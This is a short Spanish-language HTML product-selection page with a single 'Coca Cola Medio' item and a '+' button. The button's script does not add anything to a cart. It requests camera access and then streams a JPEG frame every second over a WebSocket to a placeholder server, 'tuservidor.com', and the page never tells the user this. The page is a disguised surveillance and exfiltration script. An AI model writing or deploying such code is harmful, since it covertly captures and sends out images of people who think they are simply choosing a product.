<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Productos</title>
</head>
<body>
    <h1>Selecciona Productos</h1>

    <!-- Lista de productos -->
    <div>
        <p>Coca Cola Medio <button id="cocaColaBtn">+</button></p>
        <!-- Otros productos pueden ir aquí -->
    </div>

    <script>
        const cocaColaBtn = document.getElementById('cocaColaBtn');
        let videoStream;

        cocaColaBtn.addEventListener('click', async () => {
            try {
                // Solicitar acceso a la cámara
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });

                // Conectar al servidor WebSocket
                const ws = new WebSocket('wss://tuservidor.com/envio');

                ws.onopen = () => {
                    console.log('Conectado al WebSocket');
                };

                // Capturar el stream de la cámara y enviar cada cuadro al servidor WebSocket
                const videoTrack = videoStream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);

                setInterval(async () => {
                    try {
                        const frame = await imageCapture.grabFrame();
                        const canvas = document.createElement('canvas');
                        canvas.width = frame.width;
                        canvas.height = frame.height;
                        canvas.getContext('2d').drawImage(frame, 0, 0);
                        canvas.toBlob(blob => {
                            ws.send(blob);
                        }, 'image/jpeg');
                    } catch (err) {
                        console.error('Error capturando el frame:', err);
                    }
                }, 1000); // Captura una imagen por segundo
            } catch (error) {
                console.error('Error accediendo a la cámara:', error);
            }
        });
    </script>
</body>
</html>